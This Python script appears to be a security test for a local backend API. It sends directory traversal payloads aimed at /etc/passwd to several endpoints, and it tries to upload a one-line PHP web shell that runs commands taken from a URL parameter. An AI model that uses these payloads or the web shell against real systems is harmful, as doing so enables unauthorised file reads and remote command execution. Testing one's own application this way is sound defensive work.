#!/usr/bin/env python3
"""
Directory Traversal Test Script
Tests the backend API for directory traversal vulnerabilities
"""

import requests

BASE_URL = "http://localhost:8080"

def test_directory_traversal():
    """Test for directory traversal in file paths"""
    print("Testing for directory traversal vulnerabilities...")
    
    # Test paths that might be vulnerable
    traversal_payloads = [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
        "..%2f..%2f..%2fetc%2fpasswd",
    ]
    
    # Test in various endpoints
    endpoints = [
        f"{BASE_URL}/events/",
        f"{BASE_URL}/profile/",
        f"{BASE_URL}/users/",
    ]
    
    for endpoint in endpoints:
        for payload in traversal_payloads:
            url = endpoint + payload
            try:
                print(f"Testing: {url}")
                response = requests.get(url)
                print(f"Status: {response.status_code}")
                
                if response.status_code == 200:
                    if "root:" in response.text or "bin:" in response.text:
                        print("  -> VULNERABILITY: Directory traversal successful!")
                    else:
                        print("  -> No obvious directory traversal")
                elif response.status_code == 404:
                    print("  -> Path not found (expected)")
                else:
                    print(f"  -> Status code: {response.status_code}")
            except Exception as e:
                print(f"  -> Error: {e}")
            print()

def test_file_upload_vulnerability():
    """Test for file upload vulnerabilities"""
    print("Testing for file upload vulnerabilities...")
    
    # Note: This app doesn't seem to have file upload endpoints
    # But let's check if there are any
    print("Checking for file upload endpoints...")
    
    # Common file upload endpoints
    upload_endpoints = [
        f"{BASE_URL}/upload",
        f"{BASE_URL}/files/upload",
        f"{BASE_URL}/profile/avatar",
    ]
    
    for endpoint in upload_endpoints:
        try:
            print(f"Testing endpoint: {endpoint}")
            # Try to upload a malicious file
            files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
            response = requests.post(endpoint, files=files)
            print(f"Status: {response.status_code}")
            if response.status_code == 200:
                print("  -> File upload endpoint exists")
            else:
                print("  -> No file upload endpoint or access denied")
        except Exception as e:
            print(f"  -> Error: {e}")
        print()

if __name__ == "__main__":
    test_directory_traversal()
    test_file_upload_vulnerability()